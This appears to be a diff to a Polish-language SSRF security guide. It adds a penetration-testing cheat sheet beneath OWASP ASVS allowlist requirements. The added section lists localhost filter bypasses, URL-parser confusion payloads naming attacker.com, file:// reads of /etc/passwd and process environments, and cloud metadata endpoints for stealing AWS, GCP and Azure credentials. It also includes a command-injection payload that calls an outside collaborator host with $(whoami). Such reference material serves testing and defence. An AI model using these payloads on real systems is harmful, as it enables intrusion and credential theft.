@@ -159,3 +159,53 @@ Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas 
 | V13.2.4 | Backend Communication Configuration | Verify that an allowlist is used to define the external resources or systems with which the application is permitted to communicate (e.g., for outbound requests, data loads, or file access). This allowlist can be implemented at the application layer, web server, firewall, or a combination of different layers. |
 | V13.2.5 | Backend Communication Configuration | Verify that the web or application server is configured with an allowlist of resources or systems to which the server can send requests or load data or files from. |
 | V15.3.2 | Defensive Coding | Verify that where the application backend makes calls to external URLs, it is configured to not follow redirects unless it is intended functionality. |
+
+
+---
+
+## HackTricks Tips
+
+### IP/Host Filter Bypass
+
+```
+0                           # zero = localhost na Linux
+http://127.1               # short form
+http://2130706433/         # decimal 127.0.0.1
+http://0x7f000001/         # hex
+http://[::]:80/            # IPv6
+127。0。0。1                # unicode dots
+localtest.me / 127.0.0.1.nip.io  # DNS resolving to localhost
+```
+
+### URL Parser Confusion
+
+```
+https://trusted.com@attacker.com
+https://attacker.com%23@trusted.com   # double-encoded fragment
+https://attacker.com\.trusted.com
+http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
+```
+
+**Path bypass**: `?url=https://metadata/path#/expected/path`, `..%2f..%2f/vulnerable`
+
+### Protocol Escalation
+
+- **gopher://** — full TCP: Gopherus generuje payloady dla Redis, MySQL, SMTP, Memcached
+- **file://** — `file:///etc/passwd`, `file:///proc/self/environ`
+- **curl URL globbing**: `file:///app/{.}./{.}./{app/hello.html,flag.txt}`
+- **Redirect chain**: Python redirector zwracający 302 na `gopher://` lub `127.0.0.1`
+- **DNS rebinding**: Singularity — publiczny IP na walidacji, rebind na `127.0.0.1` przed requestem
+- **SNI injection**: `openssl s_client -servername "internal.host.com"`
+
+### Cloud SSRF — Metadata
+
+- **AWS IMDSv1**: `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>`
+- **AWS ECS**: `file:///proc/self/environ` → `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` → `http://169.254.170.2/v2/credentials/<GUID>`
+- **AWS Lambda**: creds w env vars: `AWS_SESSION_TOKEN`, `AWS_SECRET_ACCESS_KEY`
+- **GCP**: `http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true` (beta = bez headera!)
+- **Azure**: wymaga `Metadata: true` header; blokuje `X-Forwarded-For`
+
+### Blind SSRF
+
+- **Via Referer header** — analytics software podąża za URL → Burp Collaborator Everywhere
+- **SSRF + cmd injection combo**: `url=http://collaborator.net?$(whoami)`
